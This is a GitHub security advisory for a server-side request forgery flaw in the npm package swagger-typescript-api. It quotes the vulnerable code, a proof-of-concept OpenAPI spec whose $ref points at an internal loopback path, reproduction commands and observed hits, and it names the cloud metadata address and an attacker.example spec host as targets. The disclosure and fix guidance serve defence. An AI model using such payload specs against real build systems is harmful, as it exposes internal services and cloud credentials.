# [M] swagger-typescript-api vulnerable to Server-Side Request Forgery via spec `$ref`

## Summary
Severity: Medium
Advisory: GHSA-x36r-4347-pm5x
CVE: CVE-2026-54663
CWE: CWE-20, CWE-441, CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-07-29
Source: https://github.com/advisories/GHSA-x36r-4347-pm5x
Type: github-advisory

## Affected
- npm: `swagger-typescript-api` — affected >=0 <13.12.2

## Details
### Summary

`swagger-typescript-api` walks every `$ref` value in the input OpenAPI spec and, for any `$ref` whose target is an `http(s)://` URL, issues an HTTP GET to that URL during generation (`warmUpRemoteSchemasCache`). The only URL filter is a regex that matches `^https?://` — there is **no private-IP allowlist, no DNS-rebinding protection, no redirect cap, and no same-origin check against the spec source**. A malicious OpenAPI spec can therefore force the generator process to issue HTTP requests to arbitrary hosts and paths reachable from the generator's network, including `127.0.0.1`, RFC-1918 ranges, internal hostnames, and the cloud instance-metadata endpoint at `169.254.169.254`.

The attacker model is identical to the previously reported code-injection findings: a developer or CI pipeline that runs `swagger-typescript-api generate` against an attacker-controlled spec (remote URL, third-party / public OpenAPI registry, multi-tenant tenant input, or a spec file modified via PR).

### Details

`SwaggerSchemaResolver.fetchSwaggerSchemaFile` (`src/swagger-schema-resolver.ts:122`) loads the entry-point spec. After it parses, `ResolvedSwaggerSchema` (`src/resolved-swagger-schema.ts`) calls `warmUpRemoteSchemasCache` which does a BFS over every external `$ref`:

```ts
// src/resolved-swagger-schema.ts:399-445
private async warmUpRemoteSchemasCache() {
  if (typeof this.config.url !== "string" || !this.isHttpUrl(this.config.url)) {
    return;
  }
  const visited = new Set<string>();
  const queue = [this.stripHash(this.config.url)];

  while (queue.length > 0) {
    const currentUrl = queue.shift();
    if (!currentUrl || visited.has(currentUrl)) continue;
    visited.add(currentUrl);

    if (this.externalSchemaCache.has(currentUrl)) continue;
    const schema = await this.fetchRemoteSchemaDocument(currentUrl);   // <-- HTTP GET
    if (!schema) continue;
    this.externalSchemaCache.set(currentUrl, schema);

    for (const ref of this.extractRefsFromSchema(schema)) {
      const normalizedRef = this.normalizeRef(ref);
      if (normalizedRef.startsWith("#")) continue;

      const [externalPath = ""] = normalizedRef.split("#");
      if (!externalPath) continue;

      const absoluteUrl = this.resolveAbsoluteUrl(externalPath, currentUrl);
      if (absoluteUrl && !visited.has(absoluteUrl)) {
        queue.push(absoluteUrl);                                       // <-- recurse
      }
    }
  }
}
```

The fetch itself:

```ts
// src/resolved-swagger-schema.ts:374
const response = await fetch(url, {
  headers: this.getRemoteRequestHeaders(),
});
```

…and the only URL-shape filter:

```ts
// src/resolved-swagger-schema.ts:75-78
private isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value);
}
```

There is no IP allowlist (no rejection of `127.x`, `10.x`, `172.16-31.x`, `192.168.x`, `169.254.x`, IPv6 `::1` / fc00::/7, etc.), no DNS-rebinding mitigation (the URL is passed straight to Node's built-in `fetch`, which itself follows up to 20 redirects by default), and no check that the new URL shares an origin with the spec source. Any `$ref` value that survives `isHttpUrl` is fetched.

Because `fetch` is Node's undici-backed implementation, an external 302 redirect from an attacker's spec server to an internal URL ALSO succeeds — even if the maintainer later adds a private-IP filter to the spec string itself, redirect-based SSRF would still work without additional mitigation in the fetch options (`redirect: "manual"` or a custom dispatcher with a same-host check).

### PoC

Self-contained reproducer in comments (install `swagger-typescript-api@13.12.1` into a local `node_modules`, spin up two loopback HTTP servers — one serving the spec, one pretending to be an "internal" service — run the generator against each, observe the internal server's hit count). Tested on `swagger-typescript-api@13.12.1` and Node `v24.11.1`.

**Payload spec** (served from `http://127.0.0.1:<spec-port>/spec.json`):

```json
{
  "openapi": "3.0.0",
  "info": { "title": "SSRF-payload", "version": "1.0.0" },
  "paths": {
    "/p": {
      "get": {
        "operationId": "p",
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "http://127.0.0.1:<internal-port>/INTERNAL_ONLY_PATH/secret.json"
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Steps:**

```bash
# 1. Start a loopback "internal" HTTP server that should not be reachable from a public spec.
# 2. Start a loopback "spec" HTTP server that serves the payload spec above.
# 3. Point the generator at the spec server.
npm install swagger-typescript-api@13.12.1
node -e "import('swagger-typescript-api').then(m => m.generateApi({
  output: '/tmp/out',
  url: 'http://127.0.0.1:<spec-port>/spec.json',
  httpClientType: 'fetch'
}))"
```

**Observed (control vs payload):**

```
[control] (no external $ref in spec) → internal-server hits: 0
[payload] ($ref → http://127.0.0.1:<internal-port>/...) → internal-server hits: 1
  hit: /INTERNAL_ONLY_PATH/secret.json  host=127.0.0.1:<internal-port>
```

The internal server received a `GET /INTERNAL_ONLY_PATH/secret.json` issued by the generator's `warmUpRemoteSchemasCache` while the developer was running `swagger-typescript-api generate`. The loopback target in the PoC stands in for any host reachable from the generator process — typical real-world targets include `169.254.169.254` (cloud IMDS), internal admin panels, intranet web apps, and corporate-VPN-only services.

### Impact

**Type:** Server-Side Request Forgery (CWE-918) via unrestricted external-reference resolution in a code-generation tool.

**Affected use cases:**

- A developer running `sta generate --url https://attacker.example/openapi.json` against an attacker-hosted spec.
- A developer running the generator against any third-party or public OpenAPI spec they did not author (cached APIs on public schema registries, vendor / partner specs).
- A CI/CD pipeline regenerating clients from a spec on every build.
- A multi-tenant SaaS that generates per-tenant clients from tenant-supplied specs.
- Any project where a contributor can modify the pinned spec via a pull request.

**What an attacker can do with this:**

- Probe the generator's network reachability — enumerate which RFC-1918 hosts and internal services are alive based on timing and error states.
- Hit cloud-provider instance metadata endpoints (`http://169.254.169.254/...`) on cloud-hosted CI runners. Even though the response body is not directly returned to the attacker, side effects (rate-limit, timing, error code reflected in logs) leak information.
- Trigger side effects in internal services that have GET-mutating endpoints (rare but real).
- Combine with the companion finding (Authorization-token forwarding to `$ref` URLs — filed separately) to escalate this from blind SSRF into direct credential exfiltration.

**Lifecycle:** generation-time. The fetch happens when the developer or CI pipeline runs `swagger-typescript-api generate`, not when the generated client is later imported.

**Suggested fix:**

Defense in depth at three layers, in priority order:

1. **Reject private / link-local / loopback addresses at the URL-validation layer.** Resolve the URL's hostname, check the resulting IP against IPv4 ranges `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `0.0.0.0/8`, and IPv6 equivalents (`::1`, `fc00::/7`, `fe80::/10`, `::ffff:0:0/96`). Re-resolve on every redirect to defeat DNS rebinding.
2. **Use a custom undici dispatcher with `connect` hook that re-checks the resolved IP at TCP-connect time** — the only reliable way to defeat DNS rebinding in Node's built-in `fetch`.
3. **Set `redirect: "manual"` in the `fetch` options** and validate each redirect URL through the same allowlist before following it.

If full SSRF mitigation is too invasive for a code-generation tool, at minimum surface the threat: log every external URL the generator is about to fetch (so a developer can `grep` for unexpected hosts in the output) and add an opt-out flag like `--no-external-refs` that disables `warmUpRemoteSchemasCache` entirely.

Submitted by: Hamza Haroon (thegr1ffyn)

## References
- https://github.com/acacode/swagger-typescript-api/security/advisories/GHSA-x36r-4347-pm5x
- https://github.com/acacode/swagger-typescript-api/pull/1779
- https://github.com/acacode/swagger-typescript-api/commit/306d59acb8ffbb00f953f807b97234b21f51d9de
- https://github.com/acacode/swagger-typescript-api
- https://github.com/acacode/swagger-typescript-api/releases/tag/v13.12.2
